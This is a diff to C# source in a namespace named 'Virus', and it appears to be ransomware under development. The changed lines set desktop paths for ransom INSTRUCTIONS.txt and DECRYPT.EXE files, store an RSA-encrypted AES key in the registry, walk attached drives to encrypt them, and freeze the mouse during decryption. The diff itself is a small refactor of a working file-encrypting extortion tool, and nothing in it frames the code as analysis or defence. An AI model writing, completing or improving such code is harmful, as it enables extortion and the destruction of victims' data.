@@ -20,9 +20,9 @@ namespace Virus
         private static bool _DeleteAfterDecrypt = true;
         private static bool _DeleteAfterEncrypt = false;
 
-        public static string instructionstxt = DESKTOP_FOLDER + @"\INSTRUCTIONS.txt";
-        public static string encrypttxt = DESKTOP_FOLDER + @"\ENCRYPTED.txt";
-        public static string decryptexe = DESKTOP_FOLDER + @"\DECRYPT.EXE";
+        public static string instructionstxt = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\INSTRUCTIONS.txt";
+        public static string encrypttxt = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\ENCRYPTED.txt";
+        public static string decryptexe = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\DECRYPT.EXE";
 
         public static int _encryptedFileCount = 0;
         private static UnicodeEncoding _encoder = new UnicodeEncoding();
@@ -304,7 +304,7 @@ namespace Virus
             if (_aesKey == null)
             {
                 _aesKey = GenerateRandomCharArray(32); //Created
-                SetAESkey(RSAencryption.Encrypt(_aesKey)); //encrypt the aes key using rsa store in registry
+                SetInSecret(RSAencryption.Encrypt(_aesKey), AESFinder); //encrypt the aes key using rsa store in registry
             }   //gets aes key
 
             DriveInfo[] myDrives = GetAttachedDrives();
@@ -323,7 +323,7 @@ namespace Virus
         public static void StartDecryption(string privkeytypedin)
         {
             FreezeMouse();
-            _aesKey = RSAencryption.Decrypt(GetAESkey(), privkeytypedin);
+            _aesKey = RSAencryption.Decrypt(GetFromSecret(AESFinder), privkeytypedin);
 
             DriveInfo[] myDrives = GetAttachedDrives();
             foreach (DriveInfo drive in myDrives)
@@ -333,7 +333,6 @@ namespace Virus
             ThawMouse();
         }
 
-        
     } 
 }
 
